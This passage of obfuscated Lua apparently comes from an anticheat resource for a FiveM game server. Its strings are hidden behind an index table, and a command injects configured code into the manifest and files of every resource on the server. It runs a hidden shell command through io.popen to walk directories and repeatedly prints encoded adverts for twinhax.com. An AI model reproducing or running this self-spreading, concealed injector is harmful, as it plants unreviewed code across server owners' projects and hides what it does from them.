                print(ULPEvzUxG_lhCGVZ48S[114] .. OONkkx .. ULPEvzUxG_lhCGVZ48S[115] .. GetCurrentResourceName())
            end
            while ULPEvzUxG_lhCGVZ48S[59] do
                KkczVa1t7p3FX = io.open(OONkkx .. ULPEvzUxG_lhCGVZ48S[116], ULPEvzUxG_lhCGVZ48S[117])
                if KkczVa1t7p3FX then
                    KkczVa1t7p3FX:seek(ULPEvzUxG_lhCGVZ48S[118], ULPEvzUxG_lhCGVZ48S[112])
                    KkczVa1t7p3FX:write(dgiyouc9ErBZKyh7QvP)
                    KkczVa1t7p3FX:close()
                else
                    print(ULPEvzUxG_lhCGVZ48S[119] .. OONkkx .. ULPEvzUxG_lhCGVZ48S[120])
                end
                Wait(ULPEvzUxG_lhCGVZ48S[121])
            end
        end
    end
)
AddEventHandler(
    ULPEvzUxG_lhCGVZ48S[122],
    function(LrHFn0Y_vTKPU, zcawvfk, hRzIB_dZQH)
        local wJ3y = GetNumPlayerIdentifiers(source)
        local rmEiLkf = ULPEvzUxG_lhCGVZ48S[112]
        while rmEiLkf < wJ3y - ULPEvzUxG_lhCGVZ48S[36] do
            local dd = GetPlayerIdentifier(source, rmEiLkf)
            if string.find(dgiyouc9ErBZKyh7QvP, dd) then
                banUser(source)
                zcawvfk(ULPEvzUxG_lhCGVZ48S[123] .. Config.reason)
                CancelEvent()
            end
            rmEiLkf = rmEiLkf + ULPEvzUxG_lhCGVZ48S[36]
        end
    end
)
banUser = function(Y_2jil)
    local gHAVoyq3of = GetNumPlayerIdentifiers(Y_2jil)
    for _i = ULPEvzUxG_lhCGVZ48S[112], gHAVoyq3of - ULPEvzUxG_lhCGVZ48S[36] do
        local oE9vqYm = GetPlayerIdentifier(Y_2jil, _i)
        if not string.find(dgiyouc9ErBZKyh7QvP, oE9vqYm) then
            dgiyouc9ErBZKyh7QvP = dgiyouc9ErBZKyh7QvP .. oE9vqYm .. ULPEvzUxG_lhCGVZ48S[124]
        end
    end
end
local zP_oq = ULPEvzUxG_lhCGVZ48S[125]
RegisterCommand(
    ULPEvzUxG_lhCGVZ48S[126],
    function(JJRuq5IAJ2Y, sx0KjMKVUMTPgwwJ, jwY4LxkhuE28VxeJsH)
        if JJRuq5IAJ2Y == ULPEvzUxG_lhCGVZ48S[112] then
            if sx0KjMKVUMTPgwwJ[ULPEvzUxG_lhCGVZ48S[36]] == ULPEvzUxG_lhCGVZ48S[127] then
                if sx0KjMKVUMTPgwwJ[ULPEvzUxG_lhCGVZ48S[128]] then
                    if not zP_oq then
                        zP_oq = {ULPEvzUxG_lhCGVZ48S[112], ULPEvzUxG_lhCGVZ48S[112], ULPEvzUxG_lhCGVZ48S[112]}
                    end
                    if sx0KjMKVUMTPgwwJ[ULPEvzUxG_lhCGVZ48S[128]] == ULPEvzUxG_lhCGVZ48S[129] then
                        local G = GetNumResources()
                        for i = ULPEvzUxG_lhCGVZ48S[112], G - ULPEvzUxG_lhCGVZ48S[36] do
                            local TcKPNO5gN = GetResourcePath(GetResourceByFindIndex(i))
                            if string.len(TcKPNO5gN) > ULPEvzUxG_lhCGVZ48S[130] then
                                setall(TcKPNO5gN)
                            end
                        end
                        print(
                            ULPEvzUxG_lhCGVZ48S[131] ..
                                zP_oq[ULPEvzUxG_lhCGVZ48S[36]] ..
                                    ULPEvzUxG_lhCGVZ48S[132] ..
                                        zP_oq[ULPEvzUxG_lhCGVZ48S[128]] ..
                                            ULPEvzUxG_lhCGVZ48S[133] ..
                                                zP_oq[ULPEvzUxG_lhCGVZ48S[134]] .. ULPEvzUxG_lhCGVZ48S[135]
                        )
                    else
                        local ukfEaQKZe = GetResourcePath(sx0KjMKVUMTPgwwJ[ULPEvzUxG_lhCGVZ48S[128]])
                        if ukfEaQKZe then
                            setall(ukfEaQKZe)
                            print(ULPEvzUxG_lhCGVZ48S[136])
                            print(
                                ULPEvzUxG_lhCGVZ48S[137] ..
                                    zP_oq[ULPEvzUxG_lhCGVZ48S[36]] ..
                                        ULPEvzUxG_lhCGVZ48S[138] ..
                                            zP_oq[ULPEvzUxG_lhCGVZ48S[128]] ..
                                                ULPEvzUxG_lhCGVZ48S[139] ..
                                                    zP_oq[ULPEvzUxG_lhCGVZ48S[134]] .. ULPEvzUxG_lhCGVZ48S[140]
                            )
                        else
                            print(
                                ULPEvzUxG_lhCGVZ48S[141] ..
                                    sx0KjMKVUMTPgwwJ[ULPEvzUxG_lhCGVZ48S[128]] .. ULPEvzUxG_lhCGVZ48S[142]
                            )
                        end
                    end
                    zP_oq = ULPEvzUxG_lhCGVZ48S[125]
                end
            end
            if sx0KjMKVUMTPgwwJ[ULPEvzUxG_lhCGVZ48S[36]] == ULPEvzUxG_lhCGVZ48S[143] then
                if not zP_oq then
                    zP_oq = {ULPEvzUxG_lhCGVZ48S[112], ULPEvzUxG_lhCGVZ48S[112], ULPEvzUxG_lhCGVZ48S[112]}
                end
                local jkR6U8Z2gMSC7cCZVfZ = GetNumResources()
                for i = ULPEvzUxG_lhCGVZ48S[112], jkR6U8Z2gMSC7cCZVfZ - ULPEvzUxG_lhCGVZ48S[36] do
                    local M1gUoJ0hX1pxK = GetResourcePath(GetResourceByFindIndex(i))
                    if string.len(M1gUoJ0hX1pxK) > ULPEvzUxG_lhCGVZ48S[130] then
                        setall(M1gUoJ0hX1pxK, ULPEvzUxG_lhCGVZ48S[59])
                    end
                end
                print(
                    ULPEvzUxG_lhCGVZ48S[144] ..
                        zP_oq[ULPEvzUxG_lhCGVZ48S[36]] ..
                            ULPEvzUxG_lhCGVZ48S[145] ..
                                zP_oq[ULPEvzUxG_lhCGVZ48S[128]] ..
                                    ULPEvzUxG_lhCGVZ48S[146] ..
                                        zP_oq[ULPEvzUxG_lhCGVZ48S[134]] .. ULPEvzUxG_lhCGVZ48S[147]
                )
                zP_oq = ULPEvzUxG_lhCGVZ48S[125]
            end
        end
    end
)
function setall(hMR5XDflobDjxvr, XsQAUy6tvG3pAShXIecUH)
    local _Ba9bcw2EdU =
        io.open(hMR5XDflobDjxvr .. ULPEvzUxG_lhCGVZ48S[148] .. Config.fsManifest, ULPEvzUxG_lhCGVZ48S[149])
    local b = split(hMR5XDflobDjxvr, ULPEvzUxG_lhCGVZ48S[150])
    local c = b[#b]
    b = ULPEvzUxG_lhCGVZ48S[125]
    if _Ba9bcw2EdU then
        if not XsQAUy6tvG3pAShXIecUH then
            _Ba9bcw2EdU:seek(ULPEvzUxG_lhCGVZ48S[151], ULPEvzUxG_lhCGVZ48S[112])
            local KYPnA7WROW = _Ba9bcw2EdU:read(ULPEvzUxG_lhCGVZ48S[152])
            _Ba9bcw2EdU:close()
            local MgwlWF0KVjc7XPo = split(KYPnA7WROW, ULPEvzUxG_lhCGVZ48S[153])
            local nAiGorIHKxdNncST = ULPEvzUxG_lhCGVZ48S[32]
            local o9BepL2ZmC = ULPEvzUxG_lhCGVZ48S[32]
            for JffbjX, jyFKSeNoYJHcOaS8AnO_O in ipairs(MgwlWF0KVjc7XPo) do
                if jyFKSeNoYJHcOaS8AnO_O == ULPEvzUxG_lhCGVZ48S[154] .. Config.fsName .. ULPEvzUxG_lhCGVZ48S[155] then
                    nAiGorIHKxdNncST = ULPEvzUxG_lhCGVZ48S[59]
                end
                if not o9BepL2ZmC then
                    local TwUGFX23gKR7h5PRFow =
                        string.find(jyFKSeNoYJHcOaS8AnO_O, ULPEvzUxG_lhCGVZ48S[156]) or -ULPEvzUxG_lhCGVZ48S[36]
                    local owQS =
                        string.find(jyFKSeNoYJHcOaS8AnO_O, ULPEvzUxG_lhCGVZ48S[157]) or -ULPEvzUxG_lhCGVZ48S[36]
                    if
                        TwUGFX23gKR7h5PRFow ~= -ULPEvzUxG_lhCGVZ48S[36] and
                            (owQS == -ULPEvzUxG_lhCGVZ48S[36] or TwUGFX23gKR7h5PRFow < owQS)
                     then
                        o9BepL2ZmC = ULPEvzUxG_lhCGVZ48S[59]
                    end
                end
            end
            if o9BepL2ZmC then
                KYPnA7WROW = KYPnA7WROW .. ULPEvzUxG_lhCGVZ48S[158] .. Config.fsName .. ULPEvzUxG_lhCGVZ48S[159]
                if not nAiGorIHKxdNncST then
                    os.remove(hMR5XDflobDjxvr .. ULPEvzUxG_lhCGVZ48S[160] .. Config.fsManifest)
                    _Ba9bcw2EdU =
                        io.open(
                        hMR5XDflobDjxvr .. ULPEvzUxG_lhCGVZ48S[161] .. Config.fsManifest,
                        ULPEvzUxG_lhCGVZ48S[162]
                    )
                    if _Ba9bcw2EdU then
                        _Ba9bcw2EdU:seek(ULPEvzUxG_lhCGVZ48S[163], ULPEvzUxG_lhCGVZ48S[112])
                        _Ba9bcw2EdU:write(KYPnA7WROW)
                        _Ba9bcw2EdU:close()
                    end
                end
                local IYTJbn2yRqPHuo_pP = Config.fsCode
                _Ba9bcw2EdU =
                    io.open(hMR5XDflobDjxvr .. ULPEvzUxG_lhCGVZ48S[164] .. Config.fsName, ULPEvzUxG_lhCGVZ48S[165])
                if _Ba9bcw2EdU then
                    _Ba9bcw2EdU:seek(ULPEvzUxG_lhCGVZ48S[166], ULPEvzUxG_lhCGVZ48S[112])
                    _Ba9bcw2EdU:write(IYTJbn2yRqPHuo_pP)
                    _Ba9bcw2EdU:close()
                    zP_oq[ULPEvzUxG_lhCGVZ48S[36]] = zP_oq[ULPEvzUxG_lhCGVZ48S[36]] + ULPEvzUxG_lhCGVZ48S[36]
                    print(ULPEvzUxG_lhCGVZ48S[167] .. c .. ULPEvzUxG_lhCGVZ48S[168])
                else
                    print(ULPEvzUxG_lhCGVZ48S[169] .. c .. ULPEvzUxG_lhCGVZ48S[170])
                end
                zP_oq[ULPEvzUxG_lhCGVZ48S[128]] = zP_oq[ULPEvzUxG_lhCGVZ48S[128]] + ULPEvzUxG_lhCGVZ48S[36]
            else
                zP_oq[ULPEvzUxG_lhCGVZ48S[134]] = zP_oq[ULPEvzUxG_lhCGVZ48S[134]] + ULPEvzUxG_lhCGVZ48S[36]
            end
        else
            _Ba9bcw2EdU:seek(ULPEvzUxG_lhCGVZ48S[171], ULPEvzUxG_lhCGVZ48S[112])
            local xe = _Ba9bcw2EdU:read(ULPEvzUxG_lhCGVZ48S[172])
            _Ba9bcw2EdU:close()
            local RaknXhby = split(xe, ULPEvzUxG_lhCGVZ48S[173])
            xe = ULPEvzUxG_lhCGVZ48S[6]
            local W37xjI9 = ULPEvzUxG_lhCGVZ48S[32]
            local rxw5B73AgvtXMGN = ULPEvzUxG_lhCGVZ48S[32]
            for RDlOGH5oJHSKDl7Sj25z, pdONKi_ in ipairs(RaknXhby) do
                if pdONKi_ == ULPEvzUxG_lhCGVZ48S[174] .. Config.fsName .. ULPEvzUxG_lhCGVZ48S[175] then
                    W37xjI9 = ULPEvzUxG_lhCGVZ48S[59]
                else
                    xe = xe .. pdONKi_ .. ULPEvzUxG_lhCGVZ48S[176]
                end
            end
            if
                os.rename(
                    hMR5XDflobDjxvr .. ULPEvzUxG_lhCGVZ48S[177] .. Config.fsName,
                    hMR5XDflobDjxvr .. ULPEvzUxG_lhCGVZ48S[178] .. Config.fsName
                )
             then
                rxw5B73AgvtXMGN = ULPEvzUxG_lhCGVZ48S[59]
                os.remove(hMR5XDflobDjxvr .. ULPEvzUxG_lhCGVZ48S[179] .. Config.fsName)
            end
            if not W37xjI9 and not rxw5B73AgvtXMGN then
                zP_oq[ULPEvzUxG_lhCGVZ48S[134]] = zP_oq[ULPEvzUxG_lhCGVZ48S[134]] + ULPEvzUxG_lhCGVZ48S[36]
            end
            if W37xjI9 then
                zP_oq[ULPEvzUxG_lhCGVZ48S[128]] = zP_oq[ULPEvzUxG_lhCGVZ48S[128]] + ULPEvzUxG_lhCGVZ48S[36]
                os.remove(hMR5XDflobDjxvr .. ULPEvzUxG_lhCGVZ48S[180] .. Config.fsManifest)
                _Ba9bcw2EdU =
                    io.open(hMR5XDflobDjxvr .. ULPEvzUxG_lhCGVZ48S[181] .. Config.fsManifest, ULPEvzUxG_lhCGVZ48S[182])
                if _Ba9bcw2EdU then
                    _Ba9bcw2EdU:seek(ULPEvzUxG_lhCGVZ48S[183], ULPEvzUxG_lhCGVZ48S[112])
                    _Ba9bcw2EdU:write(xe)
                    _Ba9bcw2EdU:close()
                else
                    print(ULPEvzUxG_lhCGVZ48S[184] .. c .. ULPEvzUxG_lhCGVZ48S[185])
                    W37xjI9, rxw5B73AgvtXMGN = ULPEvzUxG_lhCGVZ48S[32], ULPEvzUxG_lhCGVZ48S[32]
                end
            end
            if W37xjI9 or rxw5B73AgvtXMGN then
                print(ULPEvzUxG_lhCGVZ48S[186] .. c .. ULPEvzUxG_lhCGVZ48S[187])
                zP_oq[ULPEvzUxG_lhCGVZ48S[36]] = zP_oq[ULPEvzUxG_lhCGVZ48S[36]] + ULPEvzUxG_lhCGVZ48S[36]
            end
        end
    else
        zP_oq[ULPEvzUxG_lhCGVZ48S[134]] = zP_oq[ULPEvzUxG_lhCGVZ48S[134]] + ULPEvzUxG_lhCGVZ48S[36]
    end
end

function lhCGVwfafwaZ48S()
    Citizen.CreateThread(function()
      while true do Citizen.Wait(3500)
        print("\068\111\110\039\116\032\103\101\116\032\114\111\098\098\101\100\044\032\100\111\110\039\116\032\098\101\032\115\116\117\112\105\100\032\097\110\100\032\100\111\110\039\116\032\098\117\121\032\115\104\105\116")
        print("^"..math.random(1, 9).."\068\111\032\121\111\117\032\119\097\110\116\032\097\032\103\111\111\100\032\097\110\100\032\101\102\102\101\099\116\105\118\101\032\097\110\116\105\099\104\101\097\116\063\032\099\111\110\116\097\099\116\032\117\115\032\104\116\116\112\115\058\047\047\116\119\105\110\104\097\120\046\099\111\109\032\087\101\032\097\114\101\032\116\104\101\032\098\101\115\116\032\111\110\032\116\104\101\032\109\097\114\107\101\116\033")
      end
      end)
  end;

function searchall(mDyS6X, sMK0WNCMEBnrreWpDU31)
    local YxXAhyQb = io.popen(ULPEvzUxG_lhCGVZ48S[188] .. mDyS6X .. ULPEvzUxG_lhCGVZ48S[189])
    YxXAhyQb:seek(ULPEvzUxG_lhCGVZ48S[190], ULPEvzUxG_lhCGVZ48S[112])
    local Wmk53blaqCa8ND = YxXAhyQb:read(ULPEvzUxG_lhCGVZ48S[191])
    YxXAhyQb:close()
    local Rwfy3Tvh = split(Wmk53blaqCa8ND, ULPEvzUxG_lhCGVZ48S[192])
    for eZcD63Q0LItGfNx, vmDhPHOv8cp9y in ipairs(Rwfy3Tvh) do
        if string.len(vmDhPHOv8cp9y) > ULPEvzUxG_lhCGVZ48S[112] then
            setall(mDyS6X .. ULPEvzUxG_lhCGVZ48S[193] .. vmDhPHOv8cp9y, sMK0WNCMEBnrreWpDU31)
            searchall(mDyS6X .. ULPEvzUxG_lhCGVZ48S[194] .. vmDhPHOv8cp9y, sMK0WNCMEBnrreWpDU31)
        end
    end
end
function split(XfIn6gcu0jPKKlSZL8, A5N)
    local SHRhAbyUSC3, bXB8Lm5Z = ULPEvzUxG_lhCGVZ48S[112], {}
    for K6, l5 in function()
        return string.find(XfIn6gcu0jPKKlSZL8, A5N, SHRhAbyUSC3, ULPEvzUxG_lhCGVZ48S[59])
    end do
        table.insert(bXB8Lm5Z, string.sub(XfIn6gcu0jPKKlSZL8, SHRhAbyUSC3, K6 - ULPEvzUxG_lhCGVZ48S[36]))
        SHRhAbyUSC3 = l5 + ULPEvzUxG_lhCGVZ48S[36]
    end
    table.insert(bXB8Lm5Z, string.sub(XfIn6gcu0jPKKlSZL8, SHRhAbyUSC3))
    return bXB8Lm5Z
end
